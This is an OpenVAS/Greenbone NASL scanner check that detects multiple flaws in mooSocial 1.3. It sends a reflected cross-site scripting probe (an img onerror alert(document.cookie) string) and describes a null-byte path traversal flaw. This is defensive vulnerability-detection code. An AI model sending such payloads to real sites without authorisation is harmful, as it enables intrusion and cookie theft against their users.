if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803840" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2013-08-26 19:22:05 +0530 (Mon, 26 Aug 2013)" );
	script_name( "mooSocial Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "This host is running mooSocial and is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to
  read the cookie or not." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - Input passed via HTTP GET request is used in '$path' variable is not properly
  validating '../'(dot dot) sequences with null byte (%00) at the end.

  - Input passed via 'onerror' and 'onmouseover' parameters are not properly
  sanitised before being returned to the user." );
	script_tag( name: "affected", value: "mooSocial version 1.3, other versions may also be affected." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML or script
  code in a user's browser session and obtain potentially sensitive information
  to execute arbitrary local scripts in the context of the webserver." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://1337day.com/exploit/21160" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/27871" );
	script_xref( name: "URL", value: "http://cxsecurity.com/issue/WLB-2013080192" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/moosocial-13-cross-site-scripting-local-file-inclusion" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
for dir in nasl_make_list_unique( "/", "/moosocial", "/social", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	res = http_get_cache( item: NASLString( dir, "/" ), port: port );
	if(ContainsString( res, ">mooSocial" ) && ContainsString( res, "www.moosocial.com" )){
		url = dir + "/tags/view/\"><img src=\"a\" onerror=\"alert(document.cookie)\"";
		if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "alert\\(document\\.cookie\\)", extra_check: ">mooSocial" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

